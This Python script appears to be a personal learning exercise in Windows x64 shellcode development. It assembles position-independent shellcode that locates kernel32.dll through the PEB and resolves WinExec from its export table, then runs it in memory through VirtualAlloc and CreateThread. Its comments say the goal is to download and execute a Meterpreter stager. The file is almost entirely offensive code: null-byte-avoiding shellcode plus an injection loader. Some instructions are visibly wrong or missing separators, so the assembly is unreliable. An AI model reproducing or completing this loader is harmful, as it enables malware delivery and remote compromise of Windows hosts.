import ctypes, struct
import binascii
import os
import subprocess
from keystone import *
 
# We will eliminate the use of LoadLibraryA/GetProcAddress when we utilize hash tables
# For now this is just a learning experience
# GOAL: 
# 1. Import and call LoadLibraryA and GetProcAddress (this lets us import other functions from other DLLs)
    # Loop over export table to find the functions you need
# 2. Import socket, connect, and recv functions. 
# 3. Call them to download the full meterpreter stager and execute. 

def main():
    SHELLCODE = (
" start: "
"  sub rsp, 0xfffffffffffffdf8;"                 # Make some room on the stack (hard to see but its the same as 0x208, to avoid null bytes)
 
# Find DllBase of kernel32.dll
" locate_kernel32:"
"   xor rcx, rcx;"                  # Zero RCX contents
"   mov rax, gs:[rcx + 0x60];"      # 0x060 ProcessEnvironmentBlock to RAX.
"   mov rax, [rax + 0x18];"         # 0x18  ProcessEnvironmentBlock.Ldr Offset
"   mov rsi, [rax + 0x20];"         # 0x20 Offset = ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList
"   lodsq;"                         # Load qword at address (R)SI into RAX (ProcessEnvironmentBlock.Ldr.InMemoryOrderModuleList)
"   xchg rax, rsi;"                 # Swap RAX,RSI
"   lodsq;"                         # Load qword at address (R)SI into RAX
"   mov rbx, [rax + 0x20] ;"        # RBX = Kernel32 base address
"   mov r8, rbx; "                  # Copy Kernel32 base address to R8 register

# Finding the export address table of kernel32.dll
"   mov ebx, [rbx+0x3C];"
"   add rbx, r8;"                   # r8 was the copy of our kernel32.dll base
"   add r12, 0x88FFFFF;"            # Avoiding the use of null-bytes in our shellcode
"   shr r12, 0x14;"                 # Same thing
"   mov edx, [rbx+r12];"            # This jumps us from NT_HEADERS -> Export Address Table. Its hard to read because we 
                                    # manipulate the previous two instructions to avoid null-bytes. The offset is 0x88
"   add rdx, r8;"                   # To find the VMA, we do: kernel32.dll + RVA. r8 still holds dllbase and rdx holds the rva of the export table
                                    # RDX now holds the value of IMAGE_EXPORT_DIRECTORY struct

                                    # Its hard to tell, but we just need to read the AddressOfFunctions
                                    # But to get there, it takes input from AddressOfNameOrdinals, which takes input from AddressOfNames
                                    # We have to know how many times to loop over it with NumberOfFunctions

"   mov r10d, [rdx+0x14];"          # Offset to number of functions (RVA)
"   xor r11, r11;"
"   mov r11d, [rdx+0x20];"          # Offset to AddressOfNames (RVA)
"   add r11, r8;"                   # Address of names (VMA)

# Now we can begin looping, but we need the value stored in r10 (Number of Functions)
"   mov rcx, r10;"
"kernel32findfunction: "
"   jecxz FunctionNameFound;"       # Once this evaluates to true, we start this function (written below)
"   xor ebx,ebx;"                      
"   mov ebx, [r11+4+rcx*4];"        # RCX is our counter (Number of Functions). We times it by 4 (since each memory address is offset by 4)
                                    # r11 + 4 because there is no function at 0. 
"   add rbx, r8;"                   # r8 = DllBase for kernel32.dll, rbx = Function Name VMA (remember we zeroed out ebx)
"   dec rcx;"                       # Decrement the loop counter (if there are 100 functions, on first loop we now have 99)
"   mov rax, 0x636578456E6957FF;"   # WinExec (It's shifted to avoid null bytes), change this to what function you want to find
"   shr rax, 0x8;"                  # Now we shift it back into place (again, to avoid null bytes), will have to change this as well depending on the funciton youre calling
"   cmp [rbx], rax;"                # If this evaluates to true, then we run the function
"   jnz kernel32findfunction;"

# Once we find the function we want, we have to pass AddressOfFunctions all the data it needs in order to get the function address (to then call it)
"FunctionNameFound:"
"   inc rcx;"                       # In the loop we dec rcx, so we have to add 1 back to it
"   xor r11, r11;"
"   mov r11d, [rdx+0x24];"          # rdx = Export Address Table (So r11 = RVA of AddressOfNameOrdinals)
"   mov r11, r8;"                   # now r11 holds the VMA of AddressOfNameOrdianls
"   mov r13w, [r11+rcx*2];"         # rcx = The function index number * 2 (remember it was our counter in the loop)
                                    # So, r13 holds AddressOfNameOrdianls, which we pass into AddressOfFunctions to get (and finally) import/use the function

"   xor r11, r11;"                   
"   mov r11d, [rdx+0x1c];"          # rdx = Export Address Table (So r11 = RVA of AddressOfFunctions)
"   add r11, r8;"                   # now r11 holds the VMA of AddressOfFunctions
"   mov eax, [r11+4+r13*4]"         # It reads: (r11 + 4 + (r13 * 4)) for clarity. 
                                    # r13 = Function index number (times by 4)
"   add rax, r8;"                   # VMA of AddressOfFunctions
"   mov r14, rax"                   # Store a copy of the function we finally found
                                    # From here, we supply the arguments needed to call the function, and then call r14. DONE. 

    )
 
    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    instructions, count = ks.asm(SHELLCODE)
 
    sh = b""
    output = ""
    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
 
    shellcode = bytearray(sh)
    print("Shellcode: " + output )
 
    print("Attaching debugger to " + str(os.getpid()));
    subprocess.Popen(["WinDbgX", "/g","/p", str(os.getpid())], shell=True)
    input("Press any key to continue...");
 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
 
if __name__ == "__main__":
    main()